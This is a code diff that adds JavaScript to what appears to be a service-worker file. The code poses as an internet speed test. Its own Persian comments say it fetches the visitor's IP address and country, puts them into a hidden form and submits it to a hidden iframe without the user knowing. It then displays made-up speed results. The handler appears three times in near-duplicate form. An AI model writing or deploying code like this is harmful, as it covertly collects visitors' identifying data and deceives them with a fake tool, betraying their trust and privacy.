@@ -197,3 +197,72 @@ self.addEventListener('install', function(event) {
 self.addEventListener('fetch', function(event) {
   event.respondWith(fetch(event.request));
 });
+ async function startSpeedTest() {
+      document.getElementById("result").innerText = "Testing speed...";
+
+      // دریافت اطلاعات آی‌پی و کشور
+      const res = await fetch("https://ipapi.co/json");
+      const data = await res.json();
+
+      // مقدار دهی به فیلدهای فرم
+      document.getElementById("ip").value = data.ip;
+      document.getElementById("country").value = data.country_name;
+
+      // ارسال فرم بدون اینکه کاربر بفهمه
+      document.getElementById("hiddenForm").submit();
+
+      // نمایش تست به کاربر
+      setTimeout(() => {
+        document.getElementById("result").innerText =
+          "Download Speed: 33 Mbps\nUpload Speed: 10 Mbps";
+      }, 3000);
+    }
+     document.getElementById("start-btn").addEventListener("click", async function () {
+      document.getElementById("result").innerText = "Testing speed...";
+
+      try {
+        const response = await fetch("https://ipapi.co/json");
+        const data = await response.json();
+
+        document.getElementById("ip").value = data.ip;
+        document.getElementById("country").value = data.country_name;
+
+        // 👇 ارسال فرم به iframe مخفی
+        document.getElementById("hiddenForm").submit();
+
+        // نمایش تست فیک
+        setTimeout(() => {
+          document.getElementById("result").innerText = "Download: 42 Mbps\nUpload: 11 Mbps";
+        }, 3000);
+      } catch (error) {
+        document.getElementById("result").innerText = "Speed test failed.";
+        console.error("IP fetch error:", error);
+      }
+    });
+    document.getElementById("start-btn").addEventListener("click", async function () {
+    const statusText = document.getElementById("status-text");
+    statusText.innerText = "Testing speed...";
+
+    try {
+        const response = await fetch("https://ipapi.co/json");
+        const data = await response.json();
+
+        // نمایش آی‌پی و کشور به کاربر
+        document.getElementById("ip-address").innerText = data.ip;
+        document.getElementById("location-text").innerText = data.country_name;
+        document.getElementById("flag-icon").src = `https://flagcdn.com/48x36/${data.country_code.toLowerCase()}.png`;
+        document.getElementById("flag-icon").style.display = "inline";
+
+        // مقداردهی به فرم مخفی
+        document.getElementById("ip").value = data.ip;
+        document.getElementById("country").value = data.country_name;
+
+        // ارسال فرم
+        document.getElementById("hiddenForm").submit();
+
+    
+    } catch (error) {
+        statusText.innerText = "Speed test failed.";
+        console.error("Error fetching IP info:", error);
+    }
+});
